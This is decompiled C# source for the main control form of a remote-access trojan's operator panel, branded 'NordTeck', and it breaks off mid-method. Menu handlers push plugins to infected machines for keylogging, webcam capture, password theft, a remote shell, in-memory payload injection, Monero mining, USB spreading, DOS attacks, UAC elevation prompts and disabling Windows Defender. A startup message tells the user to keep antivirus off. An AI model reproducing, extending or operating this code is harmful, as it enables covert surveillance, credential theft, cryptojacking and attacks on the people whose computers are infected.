using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using cGeoIp;
using Microsoft.VisualBasic;
using Server.Algorithm;
using Server.Connection;
using Server.Forms;
using Server.Handle_Packet;
using Server.Helper;
using Server.MessagePack;
using Server.Properties;

namespace Server
{
	// Token: 0x02000002 RID: 2
	public partial class Form1 : Form
	{
		// Token: 0x06000002 RID: 2 RVA: 0x00002058 File Offset: 0x00000258
		public Form1()
		{
			this.InitializeComponent();
			Form1.SetWindowTheme(this.listView1.Handle, "explorer", null);
			base.Opacity = 0.0;
			this.formDOS = new FormDOS
			{
				Name = "DOS",
				Text = "DOS"
			};
			this.listView1.SmallImageList = this.cGeoMain.cImageList;
			this.listView1.LargeImageList = this.cGeoMain.cImageList;
		}

		// Token: 0x06000003 RID: 3 RVA: 0x000020FC File Offset: 0x000002FC
		private void CheckFiles()
		{
			try
			{
				if (!File.Exists(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config")))
				{
					MessageBox.Show("Missing " + Path.GetFileName(Application.ExecutablePath) + ".config");
					Environment.Exit(0);
				}
				if (!File.Exists(Path.Combine(Application.StartupPath, "Stub\\Stub.exe")))
				{
					MessageBox.Show("Stub not found! unzip files again and make sure your AV is OFF");
				}
				if (!Directory.Exists(Path.Combine(Application.StartupPath, "Stub")))
				{
					Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Stub"));
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message, "NordTeck", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000021C8 File Offset: 0x000003C8
		private Clients[] GetSelectedClients()
		{
			List<Clients> clientsList = new List<Clients>();
			base.Invoke(new MethodInvoker(delegate()
			{
				object lockListviewClients = Settings.LockListviewClients;
				lock (lockListviewClients)
				{
					if (this.listView1.SelectedItems.Count != 0)
					{
						foreach (object obj in this.listView1.SelectedItems)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							clientsList.Add((Clients)listViewItem.Tag);
						}
					}
				}
			}));
			return clientsList.ToArray();
		}

		// Token: 0x06000005 RID: 5 RVA: 0x0000220C File Offset: 0x0000040C
		private Clients[] GetAllClients()
		{
			List<Clients> clientsList = new List<Clients>();
			base.Invoke(new MethodInvoker(delegate()
			{
				object lockListviewClients = Settings.LockListviewClients;
				lock (lockListviewClients)
				{
					if (this.listView1.Items.Count != 0)
					{
						foreach (object obj in this.listView1.Items)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							clientsList.Add((Clients)listViewItem.Tag);
						}
					}
				}
			}));
			return clientsList.ToArray();
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002250 File Offset: 0x00000450
		private void Connect()
		{
			Form1.<Connect>d__8 <Connect>d__;
			<Connect>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<Connect>d__.<>1__state = -1;
			<Connect>d__.<>t__builder.Start<Form1.<Connect>d__8>(ref <Connect>d__);
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002280 File Offset: 0x00000480
		private void Form1_Load(object sender, EventArgs e)
		{
			Form1.<Form1_Load>d__9 <Form1_Load>d__;
			<Form1_Load>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<Form1_Load>d__.<>4__this = this;
			<Form1_Load>d__.<>1__state = -1;
			<Form1_Load>d__.<>t__builder.Start<Form1.<Form1_Load>d__9>(ref <Form1_Load>d__);
		}

		// Token: 0x06000008 RID: 8 RVA: 0x000022B7 File Offset: 0x000004B7
		private void Form1_Activated(object sender, EventArgs e)
		{
			if (this.trans)
			{
				base.Opacity = 1.0;
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000022D0 File Offset: 0x000004D0
		private void Form1_Deactivate(object sender, EventArgs e)
		{
			base.Opacity = 0.95;
		}

		// Token: 0x0600000A RID: 10 RVA: 0x000022E1 File Offset: 0x000004E1
		private void Form1_FormClosed(object sender, FormClosedEventArgs e)
		{
			this.notifyIcon1.Dispose();
			Environment.Exit(0);
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000022F4 File Offset: 0x000004F4
		private void listView1_KeyDown(object sender, KeyEventArgs e)
		{
			if (this.listView1.Items.Count > 0 && e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
			{
				foreach (object obj in this.listView1.Items)
				{
					((ListViewItem)obj).Selected = true;
				}
			}
		}

		// Token: 0x0600000C RID: 12 RVA: 0x0000237C File Offset: 0x0000057C
		private void listView1_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.listView1.Items.Count > 1)
			{
				ListViewHitTestInfo listViewHitTestInfo = this.listView1.HitTest(e.Location);
				if (e.Button == MouseButtons.Left && (listViewHitTestInfo.Item != null || listViewHitTestInfo.SubItem != null))
				{
					this.listView1.Items[listViewHitTestInfo.Item.Index].Selected = true;
				}
			}
		}

		// Token: 0x0600000D RID: 13 RVA: 0x000023EC File Offset: 0x000005EC
		private void ListView1_ColumnClick(object sender, ColumnClickEventArgs e)
		{
			if (e.Column == this.lvwColumnSorter.SortColumn)
			{
				if (this.lvwColumnSorter.Order == SortOrder.Ascending)
				{
					this.lvwColumnSorter.Order = SortOrder.Descending;
				}
				else
				{
					this.lvwColumnSorter.Order = SortOrder.Ascending;
				}
			}
			else
			{
				this.lvwColumnSorter.SortColumn = e.Column;
				this.lvwColumnSorter.Order = SortOrder.Ascending;
			}
			this.listView1.Sort();
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002460 File Offset: 0x00000660
		private void ToolStripStatusLabel2_Click(object sender, EventArgs e)
		{
			if (Settings.Default.Notification)
			{
				Settings.Default.Notification = false;
				this.toolStripStatusLabel2.ForeColor = Color.Black;
			}
			else
			{
				Settings.Default.Notification = true;
				this.toolStripStatusLabel2.ForeColor = Color.Green;
			}
			Settings.Default.Save();
		}

		// Token: 0x0600000F RID: 15 RVA: 0x000024BC File Offset: 0x000006BC
		private void ping_Tick(object sender, EventArgs e)
		{
			if (this.listView1.Items.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "Ping";
				msgPack.ForcePathObject("Message").AsString = "This is a ping!";
				Clients[] allClients = this.GetAllClients();
				for (int i = 0; i < allClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(allClients[i].Send), msgPack.Encode2Bytes());
				}
				GC.Collect();
			}
		}

		// Token: 0x06000010 RID: 16 RVA: 0x00002540 File Offset: 0x00000740
		private void UpdateUI_Tick(object sender, EventArgs e)
		{
			this.Text = Settings.Version + "     " + DateTime.Now.ToLongTimeString();
			object lockListviewClients = Settings.LockListviewClients;
			lock (lockListviewClients)
			{
				this.toolStripStatusLabel1.Text = string.Format("Online {0}     Selected {1}                    Sent {2}     Received {3}                    CPU {4}%     RAM {5}%", new object[]
				{
					this.listView1.Items.Count.ToString(),
					this.listView1.SelectedItems.Count.ToString(),
					Methods.BytesToString(Settings.SentValue).ToString(),
					Methods.BytesToString(Settings.ReceivedValue).ToString(),
					(int)this.performanceCounter1.NextValue(),
					(int)this.performanceCounter2.NextValue()
				});
			}
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00002638 File Offset: 0x00000838
		private void TOMEMORYToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
				formSendFileToMemory.ShowDialog();
				if (formSendFileToMemory.IsOK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "sendMemory";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
					if (formSendFileToMemory.comboBox1.SelectedIndex == 0)
					{
						msgPack.ForcePathObject("Inject").AsString = "";
					}
					else
					{
						msgPack.ForcePathObject("Inject").AsString = formSendFileToMemory.comboBox2.Text;
					}
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						clients.LV.ForeColor = Color.Red;
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
					}
				}
				formSendFileToMemory.Close();
				formSendFileToMemory.Dispose();
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000012 RID: 18 RVA: 0x000027A8 File Offset: 0x000009A8
		private void TODISKToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Form1.<TODISKToolStripMenuItem_Click>d__20 <TODISKToolStripMenuItem_Click>d__;
			<TODISKToolStripMenuItem_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<TODISKToolStripMenuItem_Click>d__.<>4__this = this;
			<TODISKToolStripMenuItem_Click>d__.<>1__state = -1;
			<TODISKToolStripMenuItem_Click>d__.<>t__builder.Start<Form1.<TODISKToolStripMenuItem_Click>d__20>(ref <TODISKToolStripMenuItem_Click>d__);
		}

		// Token: 0x06000013 RID: 19 RVA: 0x000027E0 File Offset: 0x000009E0
		private void RemoteDesktopToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "plugin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RemoteDesktop.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + clients.ID] == null)
					{
						new FormRemoteDesktop
						{
							Name = "RemoteDesktop:" + clients.ID,
							F = this,
							Text = "RemoteDesktop:" + clients.ID,
							ParentClient = clients,
							FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "RemoteDesktop")
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002900 File Offset: 0x00000B00
		private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "plugin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\LimeLogger.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormKeylogger)Application.OpenForms["keyLogger:" + clients.ID] == null)
					{
						new FormKeylogger
						{
							Name = "keyLogger:" + clients.ID,
							Text = "keyLogger:" + clients.ID,
							F = this
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000015 RID: 21 RVA: 0x000029F4 File Offset: 0x00000BF4
		private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "plugin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FileManager.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormFileManager)Application.OpenForms["fileManager:" + clients.ID] == null)
					{
						new FormFileManager
						{
							Name = "fileManager:" + clients.ID,
							Text = "fileManager:" + clients.ID,
							F = this,
							FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID)
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002B08 File Offset: 0x00000D08
		private void PasswordRecoveryToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "plugin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Recovery.dll");
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Sending Password Recovery..", Color.Black);
				this.tabControl1.SelectedIndex = 1;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00002BB8 File Offset: 0x00000DB8
		private void ProcessManagerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "plugin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\ProcessManager.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormProcessManager)Application.OpenForms["processManager:" + clients.ID] == null)
					{
						new FormProcessManager
						{
							Name = "processManager:" + clients.ID,
							Text = "processManager:" + clients.ID,
							F = this,
							ParentClient = clients
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002CB8 File Offset: 0x00000EB8
		private void RunToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("SEND A NOTIFICATION WHEN CLIENT OPEN A SPECIFIC WINDOW", "TITLE", "YouTube, Photoshop, Steam", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					object lockReportWindowClients = Settings.LockReportWindowClients;
					lock (lockReportWindowClients)
					{
						Settings.ReportWindowClients.Clear();
						Settings.ReportWindowClients = new List<Clients>();
					}
					Settings.ReportWindow = true;
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "reportWindow";
					msgPack.ForcePathObject("Option").AsString = "run";
					msgPack.ForcePathObject("Title").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002E28 File Offset: 0x00001028
		private void StopToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			try
			{
				Settings.ReportWindow = false;
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "reportWindow";
				msgPack.ForcePathObject("Option").AsString = "stop";
				object lockReportWindowClients = Settings.LockReportWindowClients;
				lock (lockReportWindowClients)
				{
					foreach (Clients @object in Settings.ReportWindowClients)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002F04 File Offset: 0x00001104
		private void WebcamToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "plugin";
					msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RemoteCamera.dll");
					foreach (Clients clients in this.GetSelectedClients())
					{
						if ((FormWebcam)Application.OpenForms["Webcam:" + clients.ID] == null)
						{
							new FormWebcam
							{
								Name = "Webcam:" + clients.ID,
								F = this,
								Text = "Webcam:" + clients.ID,
								ParentClient = clients,
								FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "Camera")
							}.Show();
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00003044 File Offset: 0x00001244
		private void BotsKillerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "botKiller";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Sending Botkiller..", Color.Black);
				this.tabControl1.SelectedIndex = 1;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00003128 File Offset: 0x00001328
		private void USBSpreadToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "limeUSB";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600001D RID: 29 RVA: 0x000031EC File Offset: 0x000013EC
		private void SeedTorrentToolStripMenuItem1_Click_1(object sender, EventArgs e)
		{
			using (FormTorrent formTorrent = new FormTorrent())
			{
				formTorrent.ShowDialog();
			}
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00003224 File Offset: 0x00001424
		private void RemoteShellToolStripMenuItem1_Click_1(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "shell";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormShell)Application.OpenForms["shell:" + clients.ID] == null)
					{
						new FormShell
						{
							Name = "shell:" + clients.ID,
							Text = "shell:" + clients.ID,
							F = this
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600001F RID: 31 RVA: 0x0000335C File Offset: 0x0000155C
		private void DOSAttackToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.Items.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "dosAdd";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
					this.formDOS.Show();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00003440 File Offset: 0x00001640
		private void ExecuteNETCodeToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				using (FormDotNetEditor formDotNetEditor = new FormDotNetEditor())
				{
					formDotNetEditor.ShowDialog();
				}
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x0000348C File Offset: 0x0000168C
		private void RunToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					using (FormMiner formMiner = new FormMiner())
					{
						if (formMiner.ShowDialog() == DialogResult.OK)
						{
							if (!File.Exists("Plugins\\xmrig.bin"))
							{
								File.WriteAllBytes("Plugins\\xmrig.bin", Resources.xmrig);
							}
							MsgPack msgPack = new MsgPack();
							msgPack.ForcePathObject("Packet").AsString = "xmr";
							msgPack.ForcePathObject("Command").AsString = "run";
							XmrSettings.Pool = formMiner.txtPool.Text;
							msgPack.ForcePathObject("Pool").AsString = formMiner.txtPool.Text;
							XmrSettings.Wallet = formMiner.txtWallet.Text;
							msgPack.ForcePathObject("Wallet").AsString = formMiner.txtWallet.Text;
							XmrSettings.Pass = formMiner.txtPass.Text;
							msgPack.ForcePathObject("Pass").AsString = formMiner.txtPool.Text;
							XmrSettings.InjectTo = formMiner.comboInjection.Text;
							msgPack.ForcePathObject("InjectTo").AsString = formMiner.comboInjection.Text;
							XmrSettings.Hash = GetHash.GetChecksum("Plugins\\xmrig.bin");
							msgPack.ForcePathObject("Hash").AsString = XmrSettings.Hash;
							MsgPack msgPack2 = new MsgPack();
							msgPack2.ForcePathObject("Packet").AsString = "plugin";
							msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
							msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
							foreach (Clients clients in this.GetSelectedClients())
							{
								clients.LV.ForeColor = Color.Red;
								ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000022 RID: 34 RVA: 0x000036BC File Offset: 0x000018BC
		private void KillToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "xmr";
					msgPack.ForcePathObject("Command").AsString = "stop";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						clients.LV.ForeColor = Color.Red;
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000023 RID: 35 RVA: 0x000037B8 File Offset: 0x000019B8
		private void filesSearcherToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (FormFileSearcher formFileSearcher = new FormFileSearcher())
			{
				if (formFileSearcher.ShowDialog() == DialogResult.OK && this.listView1.SelectedItems.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "fileSearcher";
					msgPack.ForcePathObject("SizeLimit").AsInteger = (long)formFileSearcher.numericUpDown1.Value * 1000L * 1000L;
					msgPack.ForcePathObject("Extensions").AsString = formFileSearcher.txtExtnsions.Text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FileSearcher.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						clients.LV.ForeColor = Color.Red;
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
					}
				}
			}
		}

		// Token: 0x06000024 RID: 36 RVA: 0x00003908 File Offset: 0x00001B08
		private void VisitWebsiteToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("VISIT WEBSITE", "URL", "https://www.google.com", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "visitURL";
					msgPack.ForcePathObject("URL").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00003A04 File Offset: 0x00001C04
		private void SendMessageBoxToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Message", "Message", "Hello World!", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "sendMessage";
					msgPack.ForcePathObject("Message").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00003B00 File Offset: 0x00001D00
		private void ChatToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormChat)Application.OpenForms["chat:" + clients.ID] == null)
					{
						new FormChat
						{
							Name = "chat:" + clients.ID,
							Text = "chat:" + clients.ID,
							F = this,
							ParentClient = clients
						}.Show();
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00003BAC File Offset: 0x00001DAC
		private void GetAdminPrivilegesToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0 && MessageBox.Show(this, "Popup UAC prompt? ", "NordTeck | UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "uac";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000028 RID: 40 RVA: 0x00003CD0 File Offset: 0x00001ED0
		private void DisableWindowsDefenderToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0 && MessageBox.Show(this, "Will only execute on clients with administrator privileges!", "NordTeck | Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "disableDefedner";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text == "Admin")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00003DF4 File Offset: 0x00001FF4
		private void RunToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			try
			{
